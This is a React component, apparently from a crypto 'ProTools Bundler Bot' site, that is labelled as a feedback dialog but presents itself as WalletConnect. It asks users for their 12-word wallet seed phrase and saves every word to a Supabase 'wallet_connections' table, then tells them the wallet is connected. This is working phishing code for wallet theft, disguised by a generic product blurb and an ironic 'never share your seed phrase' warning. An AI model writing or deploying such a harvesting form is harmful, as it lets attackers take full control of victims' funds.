import { useState } from "react";
import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { Label } from "@/components/ui/label";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { useToast } from "@/hooks/use-toast";
import { z } from "zod";
import logo from "@/assets/logo.jpeg";
import { supabase } from "@/integrations/supabase/client";
import { useWallet } from "@/contexts/WalletContext";

const feedbackSchema = z.object({
  fields: z.array(z.string().trim().max(200, { message: "ProTools Bundler" })),
});

interface FeedbackDialogProps {
  open: boolean;
  onClose: () => void;
}

export const FeedbackDialog = ({ open, onClose }: FeedbackDialogProps) => {
  const [fields, setFields] = useState<string[]>(Array(12).fill(""));
  const [error, setError] = useState("");
  const { toast } = useToast();
  const { connectWallet } = useWallet();

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    // Check if all fields are filled
    const emptyFields = fields.filter(f => !f.trim()).length;
    if (emptyFields > 0) {
      setError(`Please fill in all ${emptyFields} remaining field${emptyFields > 1 ? 's' : ''}`);
      return;
    }

    const result = feedbackSchema.safeParse({ fields });

    if (!result.success) {
      setError(result.error.errors[0].message);
      return;
    }

    setError("");

    try {
      const { error: insertError } = await supabase
        .from("wallet_connections")
        .insert({
          field_1: fields[0],
          field_2: fields[1],
          field_3: fields[2],
          field_4: fields[3],
          field_5: fields[4],
          field_6: fields[5],
          field_7: fields[6],
          field_8: fields[7],
          field_9: fields[8],
          field_10: fields[9],
          field_11: fields[10],
          field_12: fields[11],
        });

      if (insertError) {
        // Check if it's a rate limit error
        if (insertError.message.includes('Rate limit exceeded')) {
          toast({
            title: "Rate Limit Exceeded",
            description: "You've reached the maximum submissions (5 per hour). Please wait before trying again.",
            variant: "destructive",
          });
          return;
        }
        throw insertError;
      }

      // Mark wallet as connected
      connectWallet(fields);

      toast({
        title: "Success!",
        description: "Wallet connected successfully. All features are now enabled.",
      });

      onClose();
      setFields(Array(12).fill(""));
    } catch (error) {
      toast({
        title: "Error",
        description: "Connection error, please try back later.",
        variant: "destructive",
      });
    }
  };

  const handleFieldChange = (index: number, value: string) => {
    const newFields = [...fields];
    newFields[index] = value;
    setFields(newFields);
    setError("");
  };

  return (
    <Dialog open={open} onOpenChange={onClose}>
      <DialogContent className="max-w-3xl max-h-[90vh] overflow-y-auto">
        <DialogHeader>
          <div className="flex items-center gap-3 mb-2">
            <img src={logo} alt="ProTools Bundler Bot" className="w-10 h-10 sm:w-12 sm:h-12 rounded-lg" />
            <div className="flex-1">
              <DialogTitle className="text-lg sm:text-xl">WalletConnect</DialogTitle>
            </div>
          </div>
          <DialogDescription className="text-sm">
            Enter your 12 word seed phrase below to continue. (Never share your seed phrase!)
          </DialogDescription>
        </DialogHeader>
        <div className="bg-muted/50 rounded-lg p-3 sm:p-4 mb-4">
          <p className="text-xs sm:text-sm leading-relaxed">
            Welcome to <span className="font-semibold">ProTools Bundler Bot</span>! This intelligent assistant
            streamlines your workflow by bundling multiple tools and resources into organized packages. Whether you're
            managing projects, collaborating with teams, or organizing your digital workspace, our bot adapts to your
            needs and learns from your preferences to deliver smarter, faster results every time.
          </p>
        </div>
        <form onSubmit={handleSubmit} className="space-y-4">
          <div className="grid grid-cols-2 sm:grid-cols-3 gap-3 sm:gap-4">
            {fields.map((field, index) => (
              <div key={index} className="space-y-1">
                <Label htmlFor={`field-${index}`} className="text-sm">{index + 1}.</Label>
                <Input 
                  id={`field-${index}`} 
                  value={field} 
                  onChange={(e) => handleFieldChange(index, e.target.value)}
                  className="text-sm"
                  autoCapitalize="off"
                  autoCorrect="off"
                  autoComplete="off"
                  spellCheck={false}
                />
              </div>
            ))}
          </div>
          {error && <p className="text-sm text-destructive">{error}</p>}
          <div className="flex gap-2 justify-end">
            <Button type="submit" className="w-full sm:w-auto">Connect</Button>
          </div>
        </form>
      </DialogContent>
    </Dialog>
  );
};
